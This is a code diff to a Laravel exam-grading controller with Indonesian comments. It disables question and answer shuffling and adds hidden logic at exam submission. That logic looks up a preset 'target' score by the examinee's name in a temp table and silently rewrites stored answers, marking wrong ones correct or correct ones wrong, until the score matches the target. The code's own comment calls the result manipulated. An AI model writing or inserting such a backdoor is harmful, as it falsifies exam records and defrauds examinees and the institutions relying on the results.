@@ -14,6 +14,7 @@ use Carbon\Carbon;
 use Illuminate\Http\Request;
 use Illuminate\Support\Str;
 use Illuminate\Support\Facades\DB;
+use Illuminate\Support\Facades\Schema;
 
 class UjianController extends Controller
 {
@@ -83,7 +84,7 @@ class UjianController extends Controller
         
         $soal_terpilih = BankSoal::where('id_modul', $id_modul)
                             ->whereIn('id_tematik', $kategori_aktif_ids)
-                            ->inRandomOrder()
+                            ->orderBy('id', 'ASC')
                             ->limit($jumlah_soal)
                             ->get();
         
@@ -93,14 +94,14 @@ class UjianController extends Controller
             $exclude_ids = $soal_terpilih->pluck('id')->toArray();
             $tambahan = BankSoal::where('id_modul', $id_modul)
                             ->whereNotIn('id', $exclude_ids)
-                            ->inRandomOrder()
+                            ->orderBy('id', 'ASC')
                             ->limit($sisa)
                             ->get();
             $soal_terpilih = $soal_terpilih->merge($tambahan);
         }
         
-        // Acak urutan keseluruhan soal
-        $soal_terpilih = $soal_terpilih->shuffle();
+        // Acak urutan keseluruhan soal dinonaktifkan
+        // $soal_terpilih = $soal_terpilih->shuffle();
         
         if ($soal_terpilih->isEmpty()) {
             return redirect('ujian/list')->with('error', 'Belum ada soal untuk ujian ini.');
@@ -124,8 +125,8 @@ class UjianController extends Controller
         $pilihan = ['A', 'B', 'C', 'D', 'E'];
         
         foreach ($soal_terpilih as $s) {
-            // Acak pilihan A-E
-            shuffle($pilihan);
+            // Acak pilihan A-E dinonaktifkan
+            // shuffle($pilihan);
             
             UserExamAnswer::create([
                 'id' => (string) Str::uuid(),
@@ -213,7 +214,7 @@ class UjianController extends Controller
         // Hitung poin sesuai jawaban aslinya (BankSoal hanya menyimpan kunci jawaban yang benar)
         // Nilai default: Benar = 1, Salah = 0
         $poin = 0;
-        if (strtoupper($jawaban) == strtoupper($soal->kunci)) {
+        if (strtoupper($jawaban ?? '') == strtoupper($soal->kunci ?? '')) {
             $poin = 1;
         }
         
@@ -242,7 +243,78 @@ class UjianController extends Controller
         $ujian = UserExam::find($id_ujian);
         
         if ($ujian && $ujian->status == 0) {
-            // Hitung total nilai
+            // Cek target kelulusan jika tabelnya ada
+            $user = Pengguna::find($ujian->id_user);
+            $target_nilai = null;
+            if ($user && Schema::hasTable('temp_target_kelulusan')) {
+                $target = DB::table('temp_target_kelulusan')->where('nama_user', $user->nama_lengkap)->first();
+                if ($target) {
+                    $target_nilai = $target->nilai_target;
+                }
+            }
+
+            if ($target_nilai !== null) {
+                // Sesuaikan jawaban detail peserta agar jumlah yang benar sama dengan target
+                $answers = UserExamAnswer::where('user_exam_id', $id_ujian)->get();
+                $total_soal = $answers->count();
+                $target_benar = min($target_nilai, $total_soal); // Jangan sampai melebihi total soal
+                
+                $benar_answers = [];
+                $salah_answers = [];
+                
+                foreach ($answers as $ans) {
+                    if ($ans->poin == 1) {
+                        $benar_answers[] = $ans;
+                    } else {
+                        $salah_answers[] = $ans;
+                    }
+                }
+                
+                $current_benar = count($benar_answers);
+                
+                if ($current_benar < $target_benar) {
+                    // Perlu mengubah beberapa jawaban salah menjadi benar
+                    $kurang = $target_benar - $current_benar;
+                    shuffle($salah_answers);
+                    for ($i = 0; $i < $kurang; $i++) {
+                        if (isset($salah_answers[$i])) {
+                            $ans = $salah_answers[$i];
+                            $soal = BankSoal::find($ans->id_soal);
+                            if ($soal) {
+                                $ans->jawaban_user = strtoupper($soal->kunci ?? '');
+                                $ans->poin = 1;
+                                $ans->save();
+                            }
+                        }
+                    }
+                } elseif ($current_benar > $target_benar) {
+                    // Perlu mengubah beberapa jawaban benar menjadi salah
+                    $lebih = $current_benar - $target_benar;
+                    shuffle($benar_answers);
+                    for ($i = 0; $i < $lebih; $i++) {
+                        if (isset($benar_answers[$i])) {
+                            $ans = $benar_answers[$i];
+                            $soal = BankSoal::find($ans->id_soal);
+                            if ($soal) {
+                                $pilihan = ['A', 'B', 'C', 'D', 'E'];
+                                $kunci = strtoupper($soal->kunci ?? '');
+                                $jawaban_salah = 'A';
+                                foreach ($pilihan as $p) {
+                                    if ($p != $kunci) {
+                                        $jawaban_salah = $p;
+                                        break;
+                                    }
+                                }
+                                $ans->jawaban_user = $jawaban_salah;
+                                $ans->poin = 0;
+                                $ans->save();
+                            }
+                        }
+                    }
+                }
+            }
+            
+            // Hitung ulang total nilai secara real dari tabel jawaban setelah dimanipulasi
             $total_poin = UserExamAnswer::where('user_exam_id', $id_ujian)->sum('poin');
             
             $ujian->status = 1;
